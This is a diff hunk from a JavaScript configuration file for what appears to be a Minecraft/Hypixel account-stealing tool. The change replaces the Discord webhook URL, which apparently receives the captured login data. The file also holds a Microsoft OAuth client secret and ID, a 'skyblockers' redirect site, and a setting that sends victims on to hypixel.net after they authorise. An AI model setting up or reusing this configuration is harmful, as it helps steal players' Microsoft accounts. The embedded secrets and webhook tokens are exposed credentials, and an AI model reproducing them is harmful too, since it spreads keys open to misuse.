@@ -2,7 +2,7 @@
 const client_secret = 'qzq8Q~xq98lkXNAwqpxoVdUb_sCdqPMWRsv.bc6C' //you need to put the "Secret Value" here not the "Secret ID"!!!!
 const client_id = '026bef27-300f-4189-8fd1-e66c92c9bdef'
 const redirect_uri = 'https://skyblockers.onrender.com'
-const webhook_url = 'https://discord.com/api/webhooks/1100266264754147349/0PhZQ4Alep15UHQzAwP5ypdKcd6_es-7uE7SsP_9K6fxccrRSN4hpwnDyamRp85JpZtL'
+const webhook_url = 'https://discord.com/api/webhooks/1103488732465737748/JnPt0rBoSLKPq9MRnXvA6zHw5xEZ_gLgcbBo53cwGK1tg3Jg4nRWvtQojJC984m34btg'
 const redirection = 'https://hypixel.net' //Redirects the user after they login and allow (e.g 'https://hypixel.net') LEAVE BLANK IF U DONT WANT IT TO REDIRECT OR SUM IDK
 const microsoft = true //IF TRUE, WILL REDIRECT TO MICROSOFT DRECTLY INSTEAD OF THE PAGE WITH THE BUTTON
 
